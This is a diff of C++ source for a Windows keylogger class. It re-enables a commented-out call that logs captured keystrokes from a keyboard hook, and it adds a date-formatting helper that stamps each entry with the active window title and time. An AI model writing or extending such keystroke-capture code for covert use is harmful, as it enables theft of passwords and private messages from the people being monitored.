@@ -1,5 +1,8 @@
 #include "KeyLogger.h"
 
+#include <chrono>
+#include <iomanip>
+
 #include "Format.h"
 #include "PressedKey.h"
 #include "Trace.h"
@@ -50,7 +53,7 @@ LRESULT KeyLogger::HookCallback(const int nCode, const WPARAM wParam, LPARAM lPa
 
 		for (const auto& instance : _instances)
 		{
-			//instance->LogKeyboardEvent(log);
+			instance->LogKeyboardEvent(log);
 		}
 	}
 
@@ -98,17 +101,30 @@ std::string KeyLogger::GetWindowPrefix(const HWND windowHandle)
 	{
 		_lastWindowTitle = windowTitle;
 
-		// get time
-		time_t t = time(nullptr);
-		struct tm tm;
-		localtime_s(&tm, &t);
-		char s[64];
-		strftime(s, sizeof s, "%c", &tm);
+		const std::string formattedTime = FormatDate(std::chrono::system_clock::now());
 
-		return Format("[Window: %s - at %s]\n", windowTitle.c_str(), s);
+		return Format("[Window: %s - at %s]\n", windowTitle.c_str(), formattedTime.c_str());
 	}
 
 	return "";
+}
+
+std::string KeyLogger::FormatDate(const std::chrono::system_clock::time_point time)
+{
+	const std::time_t timeT = std::chrono::system_clock::to_time_t(time);
+
+	std::string formattedString(30, '\0');
+
+	tm timeInfo;
+	localtime_s(&timeInfo, &timeT);
+
+	std::strftime(
+		&formattedString[0],
+		formattedString.size(),
+		"%Y-%m-%d %H:%M:%S",
+		&timeInfo);
+
+	return formattedString;
 }
 
 void KeyLogger::LogKeyboardEvent(const std::string& log) const
